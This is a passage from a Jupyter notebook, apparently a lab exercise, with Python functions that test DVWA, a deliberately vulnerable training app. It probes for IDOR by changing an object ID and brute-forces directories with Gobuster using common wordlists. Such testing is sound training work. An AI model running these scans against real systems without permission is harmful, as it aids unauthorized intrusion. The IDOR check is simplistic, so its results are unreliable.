   "id": "a4b5ff0d",
   "metadata": {},
   "source": [
    "### 11. Insecure Direct Object Reference (IDOR)\n",
    "\n",
    "Let's implement a function to test for IDOR vulnerabilities:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eddc1912",
   "metadata": {},
   "outputs": [],
   "source": [
    "def idor():\n",
    "    print(\"[+] Testing for Insecure Direct Object Reference (IDOR)...\")\n",
    "    \n",
    "    # DVWA IDOR test page\n",
    "    idor_url = f\"{DVWA_URL}/vulnerabilities/idor/?id=1\"\n",
    "    \n",
    "    # Try accessing with a higher ID value\n",
    "    r = session.get(f\"{idor_url}&id=2\")\n",
    "    if r.status_code == 200 and \"DVWA - Vulnerable\" in r.text:\n",
    "        print(\"[!] IDOR vulnerability exists! Able to access object with ID 2.\")\n",
    "    else:\n",
    "        print(\"[-] IDOR test failed or not vulnerable.\")\n",
    "\n",
    "idor()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b4e5c6a6",
   "metadata": {},
   "source": [
    "### 12. Directory Enumeration with Gobuster\n",
    "\n",
    "Let's implement a more thorough directory brute force using Gobuster:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7fdb8eb",
   "metadata": {},
   "outputs": [],
   "source": [
    "def gobuster_scan():\n",
    "    \"\"\"Perform thorough directory brute force using gobuster\"\"\"\n",
    "    print(\"[+] Attempting to run gobuster for thorough directory enumeration...\")\n",
    "    \n",
    "    # Check if gobuster is installed\n",
    "    try:\n",
    "        if os.name == 'nt':  # Windows\n",
    "            result = subprocess.run(['where', 'gobuster'], capture_output=True, text=True)\n",
    "        else:  # Unix-like\n",
    "            result = subprocess.run(['which', 'gobuster'], capture_output=True, text=True)\n",
    "        \n",
    "        if result.returncode == 0 and result.stdout.strip():\n",
    "            print(f\"[i] Gobuster is installed at: {result.stdout.strip()}\")\n",
    "        else:\n",
    "            raise FileNotFoundError(\"Gobuster not found in PATH\")\n",
    "    except Exception as e:\n",
    "        print(f\"[!] Gobuster verification failed: {e}\")\n",
    "        print(\"[!] Please ensure Gobuster is properly installed and in your PATH.\")\n",
    "        print(\"    Install with: 'go install github.com/OJ/gobuster/v3@latest' or\")\n",
    "        print(\"    'sudo apt install gobuster' on Debian/Ubuntu or equivalent.\")\n",
    "        return False\n",
    "    \n",
    "    # Common directory wordlist locations\n",
    "    wordlists = [\n",
    "        \"/usr/share/wordlists/dirb/common.txt\",\n",
    "        \"/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\",\n",
    "        \"/usr/share/seclists/Discovery/Web-Content/common.txt\"\n",
    "    ]\n",
    "    \n",
    "    # Find a wordlist that exists\n",
    "    wordlist_path = None\n",
    "    for wl in wordlists:\n",
    "        if os.path.exists(wl):\n",
    "            wordlist_path = wl\n",
    "            break\n",
    "    \n",
    "    if not wordlist_path:\n",
    "        print(\"[!] No suitable wordlist found. Creating a basic wordlist...\")\n",
    "        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_wl:\n",
    "            # Write some common directories to try\n",
    "            common_dirs = [\n",
    "                \"admin\", \"login\", \"wp-admin\", \"backup\", \"config\", \"db\", \"sql\",\n",
    "                \"phpmyadmin\", \"mysql\", \"administrator\", \"images\", \"uploads\",\n",
    "                \"files\", \"private\", \"secret\", \"passwords\", \"logs\", \"scripts\",\n",
    "                \"test\", \"dev\", \"development\", \"api\", \"inc\", \"includes\", \"setup\",\n",
    "                \"install\", \"cgi-bin\", \"assets\"\n",
    "            ]\n",
    "            for d in common_dirs:\n",
    "                tmp_wl.write(f\"{d}\\n\")\n",
    "            wordlist_path = tmp_wl.name\n",
    "            print(f\"[i] Created temporary wordlist at: {wordlist_path}\")\n",
    "    \n",
    "    # Parse the URL to ensure we get the base URL correctly\n",
    "    from urllib.parse import urlparse\n",
    "    parsed_url = urlparse(DVWA_URL)\n",
    "    base_url = f\"{parsed_url.scheme}://{parsed_url.netloc}\"\n",
    "    \n",
    "    # Run gobuster\n",
    "    try:\n",
    "        # Basic gobuster dir command\n",
    "        gobuster_cmd = [\n",
    "            \"gobuster\", \"dir\",\n",
    "            \"-u\", base_url,\n",
    "            \"-w\", wordlist_path,\n",
    "            \"-t\", \"10\",  # 10 threads\n",
    "            \"-o\", f\"gobuster_results_{parsed_url.netloc.replace(':', '_')}.txt\"\n",
    "        ]\n",
    "        \n",
    "        print(f\"[i] Running gobuster: {' '.join(gobuster_cmd)}\")\n",
    "        process = subprocess.run(gobuster_cmd, capture_output=True, text=True, timeout=180)\n",
    "        \n",
    "        # Print results\n",
    "        if process.returncode == 0:\n",
    "            print(\"[+] Gobuster completed successfully. Results:\")\n",
    "            for line in process.stdout.splitlines():\n",
    "                if \"Status: 200\" in line or \"Status: 301\" in line or \"Status: 302\" in line:\n",
    "                    print(f\"    {line}\")\n",
    "            \n",
    "            output_file = f\"gobuster_results_{parsed_url.netloc.replace(':', '_')}.txt\"\n",
    "            print(f\"[i] Full results saved to: {output_file}\")\n",
    "            return True\n",
    "        else:\n",
    "            print(f\"[!] Gobuster returned non-zero exit code: {process.returncode}\")\n",
    "            print(f\"[!] Error: {process.stderr}\")\n",
    "            return False\n",
    "    except subprocess.TimeoutExpired:\n",
    "        print(\"[!] Gobuster scan timed out after 180 seconds.\")\n",
    "    except Exception as e:\n",
    "        print(f\"[!] Error running gobuster: {e}\")\n",
    "    finally:\n",
    "        # Clean up if we created a temporary wordlist\n",
    "        if not any(wordlist_path == wl for wl in wordlists) and os.path.exists(wordlist_path):\n",
    "            os.remove(wordlist_path)\n",
    "            print(f\"[i] Removed temporary wordlist: {wordlist_path}\")\n",
    "    \n",
    "    return False\n",
    "\n",
    "gobuster_scan()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
